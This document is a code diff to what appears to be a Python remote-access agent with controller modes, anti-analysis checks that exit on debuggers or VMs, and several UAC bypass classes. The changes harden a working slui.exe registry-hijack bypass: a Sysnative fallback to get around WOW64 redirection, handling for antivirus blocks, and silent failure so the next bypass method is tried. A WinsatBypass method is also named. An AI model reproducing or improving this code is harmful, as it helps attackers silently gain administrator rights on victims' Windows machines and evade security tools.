@@ -157,6 +157,7 @@ DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated atte
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
 KEEP_ORIGINAL_PROCESS = True  # TRUE = Don't exit original process after UAC bypass (keep CMD window open)
 ENABLE_ANTI_ANALYSIS = False  # FALSE = Disabled (for testing), TRUE = Enabled (exits if debuggers/VMs detected)
+DISABLE_UAC_BYPASS = False  # TRUE = Completely disable UAC bypass attempts (run as admin manually)
 
 # Controller URL override flag (set URL via env)
 USE_FIXED_SERVER_URL = True
@@ -1862,19 +1863,41 @@ class SluiBypass(UACBypassMethod):
             current_exe = self.get_current_executable()
             key_path = r"Software\Classes\exefile\shell\open\command"
             
+            # Use SystemRoot environment variable to avoid file system redirection on 32-bit Python
+            slui_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'slui.exe')
+            
+            # IMPROVED: Check for file with Sysnative fallback (32-bit Python on 64-bit Windows)
+            if not os.path.exists(slui_path):
+                # Try Sysnative path (bypasses WOW64 redirection)
+                sysnative_path = slui_path.replace('System32', 'Sysnative')
+                if os.path.exists(sysnative_path):
+                    slui_path = sysnative_path
+                    debug_print("[UAC] Using Sysnative path to bypass WOW64 redirection")
+                else:
+                    debug_print("[UAC] slui.exe not found - skipping this method")
+                    return False
+            
             key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
             winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
-            # Use SystemRoot environment variable to avoid file system redirection on 32-bit Python
-            slui_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'slui.exe')
-            process = subprocess.Popen(
-                [slui_path],
-                creationflags=subprocess.CREATE_NO_WINDOW,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )
+            # IMPROVED: Better error handling for subprocess
+            try:
+                process = subprocess.Popen(
+                    [slui_path],
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE
+                )
+            except FileNotFoundError:
+                debug_print("[UAC] slui.exe not found during execution (file system redirection)")
+                self.cleanup_registry(key_path)
+                return False
+            except PermissionError:
+                debug_print("[UAC] slui.exe blocked by permissions or antivirus")
+                self.cleanup_registry(key_path)
+                return False
             
             try:
                 process.communicate(timeout=10)
@@ -1890,7 +1913,8 @@ class SluiBypass(UACBypassMethod):
                 self.cleanup_registry(key_path)
             except (OSError, PermissionError):
                 pass
-            raise UACBypassError(f"Slui bypass failed: {e}")
+            debug_print(f"[UAC] Slui bypass failed: {e}")
+            return False  # Silent fail, try next method
 
 class WinsatBypass(UACBypassMethod):
     """Enhanced UAC bypass using winsat.exe (UACME Method 67)"""
@@ -2127,6 +2151,12 @@ def attempt_uac_bypass():
     debug_print("=" * 80)
     debug_print("[UAC BYPASS] attempt_uac_bypass() called")
     debug_print("=" * 80)
+    
+    # Check if UAC bypass is disabled
+    if DISABLE_UAC_BYPASS:
+        debug_print("[UAC BYPASS] DISABLED by configuration flag")
+        debug_print("[UAC BYPASS] Set DISABLE_UAC_BYPASS = False to enable")
+        return False
     
     if not WINDOWS_AVAILABLE:
         debug_print("❌ [UAC BYPASS] Not Windows - bypass not available")
